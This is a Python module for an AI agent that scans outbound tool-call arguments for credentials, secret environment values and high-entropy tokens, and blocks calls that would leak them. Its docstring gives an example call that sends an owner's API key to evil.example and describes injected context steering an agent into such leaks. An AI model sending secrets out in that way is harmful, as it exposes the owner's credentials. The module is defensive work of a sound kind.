"""Outbound argument scan (the egress guard).

Most agent defenses are on *input*: injection scans, untrusted-content
wrapping, the approval card itself. This is the one chokepoint that inspects
what *leaves* — a poisoned context or a manipulated turn can steer a secret
into a tool argument:

    fetch_url("https://evil.example?x=sk-ant-...the-owner's-key...")

The approval card is a backstop for RED sends, but standing-authorized YELLOW
reads have no per-call gate at all — they are the bigger hole. The gate runs
this scan before any non-GREEN call, including at PROPOSE time, so a
secret-bearing proposal never even reaches the approval surface.

Contract: `scan_outbound(tool, args) -> (allow: bool, reason: str)`.
`allow=False` means refuse the call; `reason` names the matched *shape* and
NEVER contains the offending value — it is safe to audit and to surface to
the model.
"""
from __future__ import annotations

import json
import math
import os
import re
from typing import Any, Dict, Tuple

# ── Credential / secret shapes ───────────────────────────────────────────────
# (label, compiled regex). The label is what gets audited and returned — it
# describes the kind of secret, never the value. Patterns are deliberately
# specific (anchored prefixes, structural markers) so ordinary prose and URLs
# do not trip them.
_CREDENTIAL_PATTERNS = [
    ("private_key_block",
     re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    # "Bearer <token>": require a substantial token after it so the bare
    # English word "bearer" in a sentence does not match.
    ("bearer_token",
     re.compile(r"\bBearer\s+[A-Za-z0-9\-._~+/]{20,}=*", re.IGNORECASE)),
    ("basic_auth_header",
     re.compile(r"\bBasic\s+[A-Za-z0-9+/]{16,}=*")),
    ("aws_access_key_id", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("github_token",
     re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}\b"
                r"|\bgithub_pat_[A-Za-z0-9_]{40,}\b")),
    ("slack_token", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b")),
    ("stripe_key", re.compile(r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}\b")),
    ("anthropic_key", re.compile(r"\bsk-ant-[A-Za-z0-9\-_]{20,}\b")),
    ("openai_key", re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9]{20,}\b")),
    ("google_api_key", re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b")),
    ("gcp_service_account", re.compile(r'"type"\s*:\s*"service_account"')),
    # Generic "<secret-ish name> = <value>" assignments with a long opaque value.
    ("inline_secret_assignment",
     re.compile(r"(?i)\b(?:api[_-]?key|secret|password|passwd|token|"
                r"access[_-]?token|private[_-]?key)\b\s*[:=]\s*"
                r"['\"]?[A-Za-z0-9\-._/+]{16,}")),
]

# Env-var names whose *values* this process holds and must never let leave.
# Matched by substring on the UPPERCASED name; PUBLIC keys are exempt (a
# public key is meant to be shared).
_SENSITIVE_ENV_MARKERS = ("KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
                          "PWD", "PRIVATE", "CREDENTIAL")
_ENV_EXEMPT_MARKERS = ("PUBLIC",)
# Don't treat trivially-short or boolean-ish env values as secrets — they
# cause false positives (a flag "1" appears in any query).
_MIN_ENV_VALUE_LEN = 10
_ENV_VALUE_NOISE = {"true", "false", "none", "null", "0", "1"}

# High-entropy backstop: a contiguous opaque token that looks like a secret
# even though it matched no named pattern. Tuned conservative — long enough
# and mixed enough that ordinary words and slugs do not trip it.
_TOKEN_RE = re.compile(r"[A-Za-z0-9+/=_\-]{48,}")
_ENTROPY_BITS_MIN = 4.3
# URLs are stripped before the entropy backstop runs: legitimate signed/CDN
# URLs carry long opaque tokens indistinguishable from secrets by entropy
# alone. The named patterns and the env-value match still scan the FULL text
# (URLs included), so a known-shape key embedded in a URL is still caught —
# only the noisy generic heuristic skips URL bodies.
_URL_RE = re.compile(r"https?://\S+")


def _stringify(args: Dict[str, Any]) -> str:
    try:
        return json.dumps(args, ensure_ascii=False, default=str)
    except Exception:
        return repr(args)


def _scan_credentials(text: str) -> str:
    for label, rx in _CREDENTIAL_PATTERNS:
        if rx.search(text):
            return f"matches a credential pattern ({label})"
    return ""


def _scan_env_secrets(text: str) -> str:
    """Refuse if any sensitive env *value* this process holds appears verbatim
    in the outbound args. The value is never logged or returned — only the var
    name, which is not itself a secret."""
    for name, value in os.environ.items():
        up = name.upper()
        if any(m in up for m in _ENV_EXEMPT_MARKERS):
            continue
        if not any(m in up for m in _SENSITIVE_ENV_MARKERS):
            continue
        v = (value or "").strip()
        if len(v) < _MIN_ENV_VALUE_LEN or v.lower() in _ENV_VALUE_NOISE:
            continue
        if v in text:
            return f"contains the value of a sensitive environment variable ({name})"
    return ""


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts: Dict[str, int] = {}
    for ch in s:
        counts[ch] = counts.get(ch, 0) + 1
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _scan_high_entropy(text: str) -> str:
    """Backstop for opaque secrets that match no named prefix: a long
    contiguous token, high entropy, AND mixed character classes — base64/hex
    secrets have all three; English words and tidy URL slugs do not."""
    text = _URL_RE.sub(" ", text)
    for m in _TOKEN_RE.finditer(text):
        tok = m.group(0)
        if not (any(c.islower() for c in tok)
                and any(c.isupper() for c in tok)
                and any(c.isdigit() for c in tok)):
            continue
        if _shannon_entropy(tok) >= _ENTROPY_BITS_MIN:
            return "contains a long high-entropy token that looks like a secret"
    return ""


def scan_outbound(tool: str, args: Dict[str, Any]) -> Tuple[bool, str]:
    """Inspect outbound tool arguments before they run (or are proposed).
    Returns (allow, reason); reason never embeds the offending value."""
    try:
        text = _stringify(args)
    except Exception:
        # Cannot evaluate the args → fail closed: a security gate treats
        # "can't tell" as deny.
        return False, "outbound arguments could not be inspected (failed closed)"
    if not text:
        return True, ""
    for scan in (_scan_credentials, _scan_env_secrets, _scan_high_entropy):
        reason = scan(text)
        if reason:
            return False, reason
    return True, ""
